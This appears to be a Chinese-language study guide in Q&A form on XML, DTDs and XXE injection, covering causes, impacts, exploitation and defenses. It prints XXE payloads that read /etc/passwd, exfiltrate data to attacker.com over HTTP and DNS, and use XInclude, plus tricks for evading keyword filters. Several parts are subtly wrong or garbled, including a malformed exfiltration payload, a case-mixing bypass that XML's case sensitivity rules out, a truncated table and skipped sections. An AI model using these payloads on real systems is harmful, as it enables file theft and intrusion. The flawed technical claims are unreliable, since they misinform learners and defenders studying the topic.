<h3 class="md-end-block md-heading"><span class="md-plain">1. 什么是 XML？XML 的文档格式是怎么样的？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">XML 定义</span></strong></span><span class="md-plain">：XML（可扩展标记语言，eXtensible Markup Language）是一种用于存储和传输结构化数据的标记语言，重点在于</span><span class="md-pair-s "><strong><span class="md-plain">数据的结构和含义</span></strong></span><span class="md-plain">，而非展示（区别于 HTML）。其标签可自定义，具有极强的可扩展性。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">文档格式</span></strong></span><span class="md-plain">：</span> <span class="md-plain">一个标准的 XML 文档结构包括：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">XML 声明</span></strong></span><span class="md-plain">：位于文档开头，定义版本和编码（如 </span><span class="md-pair-s" spellcheck="false"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">根元素</span></strong></span><span class="md-plain">：整个文档的唯一顶级元素，所有其他元素都是其后代（如 </span><span class="md-pair-s" spellcheck="false"><code>&lt;root&gt;...&lt;/root&gt;</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">子元素</span></strong></span><span class="md-plain">：嵌套在根元素或其他元素中的标记，需正确闭合（如 </span><span class="md-pair-s" spellcheck="false"><code>&lt;user&gt;&lt;name&gt;test&lt;/name&gt;&lt;/user&gt;</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">属性</span></strong></span><span class="md-plain">：元素的附加信息，以键值对形式存在（如 </span><span class="md-pair-s" spellcheck="false"><code>&lt;user id=&quot;123&quot;&gt;test&lt;/user&gt;</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注释</span></strong></span><span class="md-plain">：以 </span><span class="md-pair-s" spellcheck="false"><code>&lt;!-- 注释内容 --&gt;</code></span><span class="md-plain"> 表示，不被解析器处理。</span></p>
</li>
</ul>


```xml
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
  <book category="fiction">
    <title>XXE 安全指南</title>
    <author>安全研究员</author>
  </book>
</bookstore>
```


</li>
</ul>
<h3 class="md-end-block md-heading md-focus"><span class="md-plain">2. XML 中什么是实体？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">实体是 XML 中的</span><span class="md-pair-s "><strong><span class="md-plain">占位符</span></strong></span><span class="md-plain">，用于表示特定内容，可理解为 “变量”。常见类型包括：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">预定义实体</span></strong></span><span class="md-plain">：XML 内置的实体，用于表示特殊字符（如 </span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain"> 代表 </span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">，</span><span class="md-pair-s" spellcheck="false"><code>&gt;</code></span><span class="md-plain"> 代表 </span><span class="md-pair-s" spellcheck="false"><code>&gt;</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内部实体</span></strong></span><span class="md-plain">：在 DTD 中定义的本地实体，仅在当前 XML 文档中有效。</span> <span class="md-plain">格式：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</code></span> <span class="md-plain">示例：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!ENTITY author &quot;安全研究员&quot;&gt;</code></span><span class="md-plain">，使用时 </span><span class="md-pair-s" spellcheck="false"><code>&lt;name&gt;&amp;author;&lt;/name&gt;</code></span><span class="md-plain"> 会被替换为 “安全研究员”。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">外部实体</span></strong></span><span class="md-plain">：引用外部资源（文件、URL 等）的实体，是 XXE 漏洞的核心。</span> <span class="md-plain">格式：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!ENTITY 实体名 SYSTEM &quot;外部资源路径&quot;&gt;</code></span> <span class="md-plain">示例：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></span><span class="md-plain">，解析时会读取本地 </span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain"> 文件。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">参数实体</span></strong></span><span class="md-plain">：仅在 DTD 中使用的实体，以 </span><span class="md-pair-s" spellcheck="false"><code>%</code></span><span class="md-plain"> 开头，用于简化 DTD 定义。</span> <span class="md-plain">格式：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!ENTITY % 实体名 &quot;实体值&quot;&gt;</code></span> <span class="md-plain">示例：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!ENTITY % dtd SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;%dtd;</code></span><span class="md-plain">（引用外部 DTD）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3. DTD 相关知识详解</span></h3>
<p class="md-end-block md-p"><span class="md-plain">DTD（文档类型定义，Document Type Definition）是 XML 的</span><span class="md-pair-s "><strong><span class="md-plain">结构定义语言</span></strong></span><span class="md-plain">，用于规定 XML 文档的合法元素、属性、嵌套关系等。其核心作用是确保 XML 文档的结构化和有效性。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">DTD 的两种形式</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内部 DTD</span></strong></span><span class="md-plain">：定义在 XML 文档内部，通过</span><span class="md-pair-s" spellcheck="false"><code>&lt;!DOCTYPE 根元素 [DTD内容]&gt;</code></span><span class="md-plain">声明。</span></p>
<p class="md-end-block md-p"><span class="md-plain">示例：</span></p>



```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ELEMENT root (user)>
  <!ELEMENT user (name)>
  <!ELEMENT name (#PCDATA)>
]>
<root><user><name>test</name></user></root>
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">外部 DTD</span></strong></span><span class="md-plain">：定义在外部文件中，通过 </span><span class="md-pair-s" spellcheck="false"><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD路径&quot;&gt;</code></span><span class="md-plain"> 引用。</span> <span class="md-plain">示例：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!DOCTYPE root SYSTEM &quot;http://example.com/structure.dtd&quot;&gt;</code></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">DTD 与实体的关系</span></strong></span><span class="md-plain">：实体（尤其是外部实体）通常在 DTD 中定义，这也是 XXE 漏洞的关键 —— 攻击者通过构造恶意 DTD，注入外部实体实现攻击。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">4. 什么是 XXE 漏洞？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XXE（XML External Entity Injection，XML 外部实体注入）漏洞是指当应用程序</span><span class="md-pair-s "><strong><span class="md-plain">解析不可信的 XML 输入时，未正确限制外部实体的引用</span></strong></span><span class="md-plain">，导致攻击者可通过构造恶意 XML 文档，读取本地文件、探测内网、执行远程代码（部分场景）等。</span></p>
<p class="md-end-block md-p"><span class="md-plain">其核心是</span><span class="md-pair-s "><strong><span class="md-plain">滥用 XML 外部实体</span></strong></span><span class="md-plain">：攻击者在 XML 的 DTD 中定义外部实体，引用本地文件或远程资源，XML 解析器会执行该引用，导致信息泄露或其他危害。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">5. XXE 漏洞的原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XXE 漏洞的原理基于 XML 解析器对外部实体的处理机制：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">应用程序接收并解析用户提交的 XML 数据（如 API 接口、文件上传等场景）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者构造的 XML 文档中包含恶意 DTD，定义了引用外部资源（如本地文件、远程服务器）的外部实体。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若 XML 解析器</span><span class="md-pair-s "><strong><span class="md-plain">未禁用外部实体功能</span></strong></span><span class="md-plain">（默认配置可能允许），会解析该外部实体，读取引用的资源内容或向远程服务器发送请求。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">解析结果可能通过应用程序响应回显给攻击者（有回显），或需通过外带方式获取（无回显）。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">6. XXE 漏洞形成原因是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XXE 漏洞的形成主要源于以下几点：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">解析器配置不当</span></strong></span><span class="md-plain">：XML 解析器默认启用外部实体解析（如 Java、Python 等语言的解析库默认允许外部实体）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">输入验证缺失</span></strong></span><span class="md-plain">：应用程序未对用户提交的 XML 数据进行严格过滤，允许包含恶意 DTD、ENTITY 等关键字的内容。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">开发人员安全意识不足</span></strong></span><span class="md-plain">：未意识到 XML 外部实体的风险，直接解析不可信的 XML 输入。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖外部资源</span></strong></span><span class="md-plain">：应用程序设计中需要解析外部 XML 资源，未限制来源和内容。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">7. XXE 有什么危害？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XXE 漏洞的危害包括：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">读取本地敏感文件</span></strong></span><span class="md-plain">：通过外部实体引用 </span><span class="md-pair-s" spellcheck="false"><code>file:///etc/passwd</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>file:///proc/self/environ</code></span><span class="md-plain"> 等路径，获取系统配置、用户数据、密钥等。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">探测内部网络</span></strong></span><span class="md-plain">：通过引用内网 IP 和端口（如 </span><span class="md-pair-s" spellcheck="false"><code>http://192.168.1.1:8080</code></span><span class="md-plain">），探测内网主机存活和服务端口。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">远程代码执行（部分场景）</span></strong></span><span class="md-plain">：在特定解析器或环境中（如结合 PHP 的 expect 模块），可执行系统命令（较罕见）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">拒绝服务（DoS）</span></strong></span><span class="md-plain">：引用超大文件或无限循环的外部资源，耗尽服务器资源。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">信息泄露</span></strong></span><span class="md-plain">：获取应用程序源码、数据库凭证等敏感信息，为后续攻击铺路。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">8. XXE 如何利用？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XXE 的利用步骤如下（以读取本地文件为例）：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">构造恶意 XML 文档</span></strong></span><span class="md-plain">：包含 DTD 声明和外部实体，引用目标文件。</span></p>
<p class="md-end-block md-p"><span class="md-plain">示例（有回显场景）：</span></p>



```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">提交 XML 数据</span></strong></span><span class="md-plain">：将构造的 XML 发送到应用程序的 XML 解析端点（如 API 接口、文件上传功能）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取结果</span></strong></span><span class="md-plain">：若应用程序回显解析结果，可直接看到 </span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain"> 的内容；若无回显，需通过外带数据方式（如向攻击者服务器发送请求）获取。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">9. 无回显场景下如何利用 XXE 漏洞外带数据？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">无回显场景（解析结果不直接返回）下，需通过</span><span class="md-pair-s "><strong><span class="md-plain">外带数据</span></strong></span><span class="md-plain">将信息发送到攻击者控制的服务器，常用方法：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">HTTP/FTP 外带</span></strong></span><span class="md-plain">：构造外部实体引用攻击者的 HTTP/FTP 服务器，将读取的文件内容作为 URL 参数或路径的一部分。</span> <span class="md-plain">示例：</span></p>



```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % xxe SYSTEM "http://attacker.com/log?data=%file;">
]>
<root>&xxe;</root>
```


<p class="md-end-block md-p"><span class="md-plain">解析时，</span><span class="md-pair-s" spellcheck="false"><code>%file</code></span><span class="md-plain"> 会被替换为 </span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain"> 内容，攻击者服务器日志中可看到该数据。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">DNS 日志外带</span></strong></span><span class="md-plain">：利用 DNS 解析记录，将数据编码后作为域名的一部分（需结合 DNSlog 平台）。</span> <span class="md-plain">示例：</span><span class="md-pair-s" spellcheck="false"><code>&lt;!ENTITY xxe SYSTEM &quot;http://{base64(文件内容)}.attacker.com&quot;&gt;</code></span><span class="md-plain">，DNS 服务器会记录包含文件内容的域名解析请求。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">参数实体嵌套</span></strong></span><span class="md-plain">：通过多层参数实体拼接数据，最终发送到攻击者服务器。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">10. XInclude 攻击是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XInclude 是 XML 的一项标准，用于</span><span class="md-pair-s "><strong><span class="md-plain">在 XML 文档中包含其他 XML 文档的部分内容</span></strong></span><span class="md-plain">（类似 “文件包含”）。XInclude 攻击是指攻击者利用 XInclude 功能，在禁用外部 DTD 的场景下，绕过防御并注入外部实体。</span></p>
<p class="md-end-block md-p"><span class="md-plain">原理：若应用程序支持 XInclude 且未限制其使用，攻击者可构造包含 XInclude 元素的 XML 片段，引用外部资源。</span> <span class="md-plain">示例：</span></p>



```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```


<p class="md-end-block md-p"><span class="md-plain">解析时会包含 </span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain"> 的内容，无需声明 DTD，可绕过对 DOCTYPE、ENTITY 的过滤。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">11. CSRF、XSS 和 XXE 的区别是什么？</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">维度</span></span></th>
<th><span class="td-span"><span class="md-plain">CSRF（跨站请求伪造）</span></span></th>
<th><span class="td-span"><span class="md-plain">XSS（跨站脚本）</span></span></th>
<th><span class="td-span"><span class="md-plain">XXE（XML 外部实体注入）</span></span></th>

<h3 class="md-end-block md-heading"><span class="md-plain">12. XXE 挖掘思路是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XXE 漏洞的挖掘可从以下角度入手：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">寻找 XML 输入点</span></strong></span><span class="md-plain">：排查应用程序中接受 XML 数据的功能，如 API 接口（Content-Type 为 application/xml）、文件上传（.xml、.docx、.xlsx 等含 XML 的文件）、配置导入功能、SOAP 服务、RSS 订阅解析。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">测试外部实体支持</span></strong></span><span class="md-plain">：向 XML 输入点提交包含外部实体的 Payload（如引用 </span><span class="md-pair-s" spellcheck="false"><code>http://attacker.com/test</code></span><span class="md-plain">），监控攻击者服务器是否收到请求。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">验证文件读取</span></strong></span><span class="md-plain">：尝试引用本地文件（如 </span><span class="md-pair-s" spellcheck="false"><code>file:///etc/passwd</code></span><span class="md-plain">），检查响应是否包含文件内容（有回显）或通过外带方式确认（无回显）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">测试 XInclude 绕过</span></strong></span><span class="md-plain">：若禁用了 DTD，尝试构造 XInclude 元素（如 </span><span class="md-pair-s" spellcheck="false"><code>&lt;xi:include href=&quot;file:///etc/passwd&quot;/&gt;</code></span><span class="md-plain">），检测是否生效。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">结合文件上传</span></strong></span><span class="md-plain">：上传包含恶意 XML 的 Office 文件（如.docx），解析时可能触发 XXE。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">检查解析器配置</span></strong></span><span class="md-plain">：通过错误信息或公开文档，判断 XML 解析器是否默认允许外部实体。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">14. XXE 的防御措施有哪些？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">防御 XXE 漏洞的核心是</span><span class="md-pair-s "><strong><span class="md-plain">限制 XML 解析器对外部实体的处理</span></strong></span><span class="md-plain">，具体措施：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">禁用外部实体</span></strong></span><span class="md-plain">：在解析器中配置禁用外部实体和参数实体。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Java：</span><span class="md-pair-s" spellcheck="false"><code>DocumentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Python（lxml）：</span><span class="md-pair-s" spellcheck="false"><code>lxml.etree.XMLParser(resolve_entities=False)</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">PHP：</span><span class="md-pair-s" spellcheck="false"><code>libxml_disable_entity_loader(true);</code></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">过滤输入</span></strong></span><span class="md-plain">：严格验证用户提交的 XML 数据，拒绝包含 </span><span class="md-pair-s" spellcheck="false"><code>DOCTYPE</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>ENTITY</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>SYSTEM</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>PUBLIC</code></span><span class="md-plain"> 等关键字的内容。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">使用安全解析器</span></strong></span><span class="md-plain">：选择默认禁用外部实体的 XML 解析库，避免使用老旧或配置宽松的解析器。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">避免解析不可信 XML</span></strong></span><span class="md-plain">：尽量使用 JSON 等格式替代 XML 传输数据；若必须使用，仅解析可信来源的 XML。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">处理文件上传</span></strong></span><span class="md-plain">：对上传的 Office 文件（如.docx），解析前先解压并清理其中的 XML 内容，移除恶意 DTD 和实体。</span></p>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">16. XXE 过滤 system 和 public 怎么绕过？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">若应用程序过滤了 </span><span class="md-pair-s" spellcheck="false"><code>SYSTEM</code></span><span class="md-plain"> 和 </span><span class="md-pair-s" spellcheck="false"><code>PUBLIC</code></span><span class="md-plain"> 关键字，可通过以下方式绕过：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">大小写混淆</span></strong></span><span class="md-plain">：如 </span><span class="md-pair-s" spellcheck="false"><code>System</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>SYSTEM</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>sYstEm</code></span><span class="md-plain"> 等，部分过滤规则仅检测小写或大写。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">编码绕过</span></strong></span><span class="md-plain">：对关键字进行 URL 编码（如 </span><span class="md-pair-s" spellcheck="false"><code>%53%59%53%54%45%4D</code></span><span class="md-plain"> 代表 </span><span class="md-pair-s" spellcheck="false"><code>SYSTEM</code></span><span class="md-plain">）、HTML 实体编码（如 </span><span class="md-pair-s" spellcheck="false"><code>&amp;SYSTEM</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">使用参数实体</span></strong></span><span class="md-plain">：通过参数实体间接引用外部资源，如：</span></p>



```xml
<!DOCTYPE test [
  <!ENTITY % xxe "SYSTEM">
  <!ENTITY % file "%xxe; 'file:///etc/passwd'">
  <!ENTITY xxe2 %file;>
]>
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用 XInclude</span></strong></span><span class="md-plain">：不依赖 </span><span class="md-pair-s" spellcheck="false"><code>SYSTEM</code></span><span class="md-plain">/</span><span class="md-pair-s" spellcheck="false"><code>PUBLIC</code></span><span class="md-plain">，直接用 XInclude 元素引用外部文件（如 </span><span class="md-pair-s" spellcheck="false"><code>&lt;xi:include href=&quot;file:///etc/passwd&quot;/&gt;</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">协议替换</span></strong></span><span class="md-plain">：使用其他协议（如 </span><span class="md-pair-s" spellcheck="false"><code>file</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>ftp</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>gopher</code></span><span class="md-plain">），部分解析器支持非 HTTP 协议。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">17. Excel 存在 XXE 漏洞吗？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">是的，Excel 文件（尤其是 </span><span class="md-pair-s" spellcheck="false"><code>.xlsx</code></span><span class="md-plain"> 格式）可能存在 XXE 漏洞。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">原理：</span><span class="md-pair-s" spellcheck="false"><code>.xlsx</code></span><span class="md-plain"> 本质是包含多个 XML 文件的 ZIP 压缩包（如 </span><span class="md-pair-s" spellcheck="false"><code>xl/workbook.xml</code></span><span class="md-plain"> 定义表格结构）。若攻击者构造包含恶意 XML 的 </span><span class="md-pair-s" spellcheck="false"><code>.xlsx</code></span><span class="md-plain"> 文件，当应用程序解析该文件时（如上传后预览、导入数据），可能触发 XXE。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">场景：服务器端解析 Excel 文件的功能（如报表导入），若未清理 XML 内容，易受攻击。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">18. Oxml_xxe 工作原理以及可以向哪些文件中嵌入 XXE 的 Payload？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">工作原理</span></strong></span><span class="md-plain">：oxml_xxe 是一个用于生成包含 XXE Payload 的 Office 文件的工具。Office 文件（如 </span><span class="md-pair-s" spellcheck="false"><code>.docx</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>.xlsx</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>.pptx</code></span><span class="md-plain">）本质是 ZIP 压缩包，内部包含大量 XML 文件。oxml_xxe 通过修改这些 XML 文件，插入恶意 DTD 和外部实体定义，当文件被解析时，触发 XXE 漏洞。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">可嵌入的文件类型</span></strong></span><span class="md-plain">：所有基于 Open XML 格式的 Office 文件，包括：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Word 文档（</span><span class="md-pair-s" spellcheck="false"><code>.docx</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Excel 表格（</span><span class="md-pair-s" spellcheck="false"><code>.xlsx</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">PowerPoint 演示文稿（</span><span class="md-pair-s" spellcheck="false"><code>.pptx</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-plain">OpenDocument 格式文件（</span><span class="md-pair-s" spellcheck="false"><code>.odt</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>.ods</code></span><span class="md-plain md-expand"> 等）</span></p>
</li>
</ul>
</li>
